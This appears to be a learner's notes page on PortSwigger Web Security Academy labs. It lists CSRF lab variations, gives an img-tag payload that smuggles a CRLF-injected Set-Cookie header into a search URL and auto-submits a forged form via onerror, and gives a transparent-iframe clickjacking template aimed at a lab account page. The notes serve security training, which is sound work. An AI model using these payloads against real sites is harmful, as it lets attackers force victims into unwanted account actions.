<h1 align="center">Portswigger</h1>
<p align="center">This page is about portswigger.net</p>

See more:

https://portswigger.net/web-security

## Variations of Cross-site request forgery (CSRF)
* CSRF where token validation depends on request method
* CSRF where token validation depends on token being present
* CSRF where token is not tied to user session
* CSRF where token is tied to non-session cookie
* CSRF where token is duplicated in cookie
* CSRF where Referer validation depends on header being present
* CSRF with broken Referer validation

### CSRF where token is tied to non-session cookie
#### Two actions in just one open

Adversaries craft a web form with some values and inject a cookie that's is related to those values given. But the adversaries need to do that in just one step.

Find a place in the website that returns something, add the link in the "src" atributte of a _img_ tag with a Set-Cookie instructions to inject a cookie in the victim's browser. Then make a submit of the form through _onerror_ atributte.

```html
<img src="https://URL/?search=test%0D%0ASet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" --action #1 - inject a needed cookie
  onerror="document.forms[0].submit()"> -- action #2 - submit
```
As the content of "src" attribute is invalid (it set a cookie on client's browser), the content of "onerror" (a submit) will execute in sequence.

%3B = ";"

##### With CRLF (%0D%0A) Injection: 

_When a browser sends a request to a web server, the web server answers back with a response containing both the HTTP response headers and the actual website content, i.e. the response body. The HTTP headers and the HTML response (the website content) are separated by a specific combination of special characters, namely a carriage return and a line feed. For short they are also known as CRLF (%0D%0A). The web server uses the CRLF to understand when new HTTP header begins and another one ends._

See more: https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a

## Clickjacking

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity; -- 0.1 to 0.0001
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
